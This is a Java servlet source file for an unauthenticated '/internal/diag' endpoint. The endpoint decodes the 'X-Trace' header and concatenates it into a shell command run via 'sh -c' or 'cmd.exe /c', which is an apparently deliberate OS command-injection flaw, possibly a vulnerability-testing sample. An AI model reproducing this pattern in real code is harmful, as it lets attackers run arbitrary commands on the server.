package com.example.web;

import java.io.IOException;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.List;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet("/internal/diag")
public class DiagnosticsServlet extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        doPost(request, response);
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {

        response.setContentType("text/plain;charset=UTF-8");

        String raw = "";
        Enumeration<String> values = request.getHeaders("X-Trace");
        if (values != null && values.hasMoreElements()) {
            raw = values.nextElement();
        }

        String text = URLDecoder.decode(raw, StandardCharsets.UTF_8.name());

        List<String> args = new ArrayList<>();

        String os = System.getProperty("os.name");
        if (os != null && os.contains("Windows")) {
            args.add("cmd.exe");
            args.add("/c");
        } else {
            args.add("sh");
            args.add("-c");
        }

        args.add("echo " + text);

        ProcessBuilder builder = new ProcessBuilder();
        builder.command(args);

        try {
            Process p = builder.start();
            response.getWriter().println("OK");
        } catch (IOException e) {
            throw new ServletException(e);
        }
    }
}